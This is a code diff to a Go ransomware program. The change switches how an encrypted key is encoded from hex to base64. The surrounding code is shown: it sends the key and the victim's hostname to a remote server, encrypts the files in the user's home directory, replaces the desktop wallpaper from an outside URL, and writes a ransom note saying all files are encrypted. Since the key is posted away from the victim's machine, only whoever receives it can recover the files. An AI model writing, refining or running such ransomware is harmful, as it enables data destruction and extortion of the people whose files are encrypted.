@@ -8,7 +8,7 @@ import (
 	"crypto/x509"
 	"crypto/sha256"
 	"encoding/pem"
-	"encoding/hex"
+	"encoding/base64"
 	"net/url"
 	"fmt"
 	"github.com/reujab/wallpaper"
@@ -45,18 +45,18 @@ func main() {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	hexKey, err := encryptKey()
+	base64key, err := encryptKey()
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	shaSum, err := sendKey(hexKey)
+	shaSum, err := sendKey(base64key)
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
 	traverseFiles(home)
-	writeNote(shaSum, hexKey)
+	writeNote(shaSum, base64key)
 }
 
 func genKey() error {
@@ -87,8 +87,8 @@ func encryptKey() (string, error) {
 		fmt.Println(err)
 		return "", err
 	}
-	encHex := hex.EncodeToString(encKey)
-	return encHex, nil
+	base64key := base64.RawStdEncoding.EncodeToString(encKey)
+	return base64key, nil
 }
 
 
@@ -149,11 +149,11 @@ func encryptFile(path string) {
 	}
 }
 
-func sendKey(hexKey string) (string, error) {
+func sendKey(base64key string) (string, error) {
 	hostname, _ := os.Hostname()
-	sum := sha256.Sum256([]byte(hexKey))
+	sum := sha256.Sum256([]byte(base64key))
 	shaSum := fmt.Sprintf("%x", sum)
-	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {hexKey}, "sha256sum": {shaSum}})
+	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {base64key}, "sha256sum": {shaSum}})
 	if err != nil || resp.StatusCode != 200 {
 		fmt.Println(err)
 		fmt.Println("HTTP Response: ", resp.StatusCode)
@@ -162,7 +162,7 @@ func sendKey(hexKey string) (string, error) {
 	return shaSum, nil
 }
 
-func writeNote(shaSum string, hexKey string) {
+func writeNote(shaSum string, base64key string) {
 	err := wallpaper.SetFromURL("https://www.gaminginstincts.com/wp-content/uploads/2019/08/Bully_2_Screenshot_Leaked_Gaming_Instincts_TV_Article_Website_Youtube_Thumbnail.jpg")
 	if err != nil {
 		fmt.Println(err)
@@ -173,7 +173,7 @@ func writeNote(shaSum string, hexKey string) {
 	}
 	defer n.Close()
 	home, _ := os.UserHomeDir()
-	s := fmt.Sprintf("All files in %s have been encrypted.\nEncrypted key: %s \nSha256Sum: %s", home, hexKey, shaSum)
+	s := fmt.Sprintf("All files in %s have been encrypted.\nEncrypted key: %s \nSha256Sum: %s", home, base64key, shaSum)
 	_, err = n.WriteString(s)
 	if err != nil {
 		fmt.Println("Error writing file: ", err)
